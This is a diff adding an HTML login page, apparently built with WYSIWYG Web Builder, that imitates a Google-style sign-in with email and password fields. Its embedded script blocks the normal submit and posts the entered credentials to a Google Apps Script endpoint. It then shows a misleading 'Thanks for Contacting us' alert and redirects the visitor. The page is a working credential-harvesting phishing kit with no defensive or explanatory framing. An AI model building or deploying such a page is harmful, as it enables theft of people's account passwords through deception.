@@ -1,0 +1,59 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Flexible Layout</title>
+<meta name="generator" content="WYSIWYG Web Builder 17 - http://www.wysiwygwebbuilder.com">
+<link href="flexible_layout.css" rel="stylesheet">
+<link href="Glogin.css" rel="stylesheet">
+</head>
+<body>
+   <div id="wb_Shape1" style="position:absolute;left:238px;top:253px;width:495px;height:487px;z-index:0;">
+      <img src="images/img0001.png" id="Shape1" alt="" width="495" height="487" style="width:495px;height:487px;">
+   </div>
+   <div id="wb_Image1" style="position:absolute;left:444px;top:320px;width:84px;height:29px;z-index:1;">
+      <img src="images/download (6).png" id="Image1" alt="" width="84" height="28">
+   </div>
+   <div id="wb_Text1" style="position:absolute;left:396px;top:367px;width:180px;height:33px;text-align:center;z-index:2;">
+      <span style="color:#696969;font-family:Arial;font-size:29px;">Welcome </span>
+   </div>
+
+
+   <form method="post" autocomplete="off" name="google-sheet" action="https://www.google.com">
+      <div id="wb_Text3" style="position:absolute;left:567px;top:759px;width:166px;height:12px;z-index:6;">
+      <span style="color:#696969;font-family:Arial;font-size:11px;">Help&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Privacy&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Terms</span>
+   </div>
+   <input type="email" id="Editbox2" style="position:absolute;left:300px;top:422px;width:373px;height:44px;z-index:7;" name="email" value="" spellcheck="false" placeholder="Enter your Email" required>
+   <input type="password" id="Editbox1" style="position:absolute;left:300px;top:493px;width:373px;height:44px;z-index:3;" name="pass" value="" spellcheck="false" placeholder="Enter your password" required>
+    <input type="submit" name="submit" id="Button1" value="Login" style="position:absolute;left:454px;top:580px;width:65px;height:35px;z-index:4;" autofocus>
+</form>
+
+  
+   <select name="Combobox1" size="1" id="Combobox1" style="position:absolute;left:238px;top:749px;width:167px;height:28px;z-index:5;">
+      <option selected value="">English (United Kingdom)</option>
+      <option>English (USA)</option>
+      <option>English (India)</option>
+   </select>
+   
+
+
+
+<script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbw43fuvqHvVDgRRIPRAUhAwhBoiNAXtw5OXBvAasuUF0QjewBg/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+               fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
+                .catch(error => console.error('Error!', error.message))
+                window.location.assign("regteach.html");
+            })
+          </script>
+
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+</body>
+</html>
